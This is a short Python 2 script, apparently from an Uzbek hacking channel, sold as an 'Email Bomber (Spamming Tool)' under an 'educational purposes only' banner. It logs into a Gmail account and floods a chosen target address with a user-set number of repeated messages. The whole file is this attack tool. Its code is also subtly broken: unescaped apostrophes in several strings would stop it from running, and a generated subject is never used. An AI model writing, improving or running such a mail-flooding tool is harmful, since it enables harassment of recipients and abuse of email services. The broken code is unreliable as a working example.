#!/usr/bin/python 2.7
#E-bomber
#FAQAT TA'LIM MAQSADIDA
#TeraHackUz ga obuna bo'lishni unutmang!!!



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            #################################################       '
print '            #                                               #       '
print '            #        Email Bomber ( Spamming Tool )         #       '
print '            #                                               #       '
print '            #                  Version 2.0                  #       '
print '            #                                               #       '
print '            #           Modified by : TeraHackUz            #       '
print '            #                                               #       '
print '            #            FAQAT TA'LIM MAQSADIDA !!          #       '
print '            #                                               #       '
print '            #################################################       '

print '                                                                   '


print '                                           '

print '    '
email = raw_input('Hujum qilish uchun email : ')
print '             '
user = raw_input('Anonymous nomi : ')
print '      '
passwd = getpass.getpass('Parol: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Xabar: ')

print '    '

total = input('Nechta xabar yuborilsin: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] To'xtatildi'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Username ni yoki parolni noto'g'ri yozdingiz.'
    sys.exit()
